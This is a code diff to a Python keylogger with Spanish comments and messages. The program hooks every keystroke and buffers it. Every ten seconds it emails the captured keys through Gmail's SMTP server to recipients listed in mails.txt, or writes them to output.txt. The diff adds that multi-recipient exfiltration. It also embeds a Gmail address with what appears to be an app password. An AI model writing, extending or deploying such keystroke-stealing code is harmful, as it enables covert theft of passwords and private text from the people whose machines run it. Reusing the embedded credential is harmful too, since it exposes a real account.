@@ -12,11 +12,12 @@ userMail = "keyloggerp531@gmail.com"
 userPass = "zdhr jzws jqiq zkqf"
 userTo = "sirofatala@gmail.com"
 mailSubject = "Registro de teclas"
-logfile = "keyfile.txt"
+logfile = "output.txt"
 wait_seconds = 10
 guardar_txt = False
 enviar_mail = False
 keys = []
+mails = []
 server = None
 
 
@@ -24,10 +25,11 @@ def oneKeyEvent(event):
     tecla = event.Key
     keys.append(tecla)
    
-    if tecla == "esc":
-        texto = formatear_tecla()
+    if tecla == "Escape":
         if enviar_mail:
-            enviar_email(texto)
+            enviar_email()
+        if guardar_txt:
+            guardar_en_archivo()
         print("\n[!] Saliendo del programa.")
         sys.exit(0)
 
@@ -43,7 +45,7 @@ def callback():
 
 def formatear_tecla():
     data = "".join(keys)
-    return data.replace("Space", " ")
+    return data.replace("space", " ")
     
 
 def guardar_en_archivo():
@@ -57,43 +59,40 @@ def guardar_en_archivo():
 
 def config_server(): 
     global server 
+    global mails 
     
+    with open("mails.txt", "r") as archivo:
+        mails = [linea.strip() for linea in archivo]
+        
     server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.ehlo()
     server.starttls()
     server.login(userMail, userPass)
     
-def enviar_email():
-    print("Entro a mail")
     
+def enviar_email():    
     try:        
-        # server=smtplib.SMTP("smtp.gmail.com", 587)
-        # server.ehlo()
-        # server.starttls()
-        # server.login(userMail, userPass)
-       
         contenido = formatear_tecla()
         mensaje = f"Subject: {mailSubject}\n\n{contenido}"
-        server.sendmail(userMail, [userTo], mensaje)
-        print("Lo termino de mandar el mail")
+        
+        for mail in mails: 
+            server.sendmail(userMail, [mail], mensaje)
         print("Correo enviado :)")
-        
-        
+                
     except Exception as e:
         print("Error al enviar el correo :(")
         import traceback
         traceback.print_exc()
 
-def revisar():
+def output():
     global keys
     while True:
         time.sleep(wait_seconds)
         if keys:
             if enviar_mail:
                 enviar_email()
-                print("salgo de mandar mail")
             if guardar_txt:
                 guardar_en_archivo()
-                print("salgo de guardar")
             keys.clear()
 
 
@@ -123,11 +122,11 @@ if __name__ == "__main__":
         sys.exit(0)
     
     if enviar_mail:
-        print("config mail")
+        print("\nPor favor espere, configurando el sistema para mandar mails, puede tardar unos instantes")
         config_server()
-        print("listo congig serrver")
+        print("Se termino de configurar")
 
     print("\nIniciando.... Presiona ESC para salir.")
-    t = threading.Thread(target=revisar, daemon=True)
+    t = threading.Thread(target=output, daemon=True)
     t.start()
     callback()
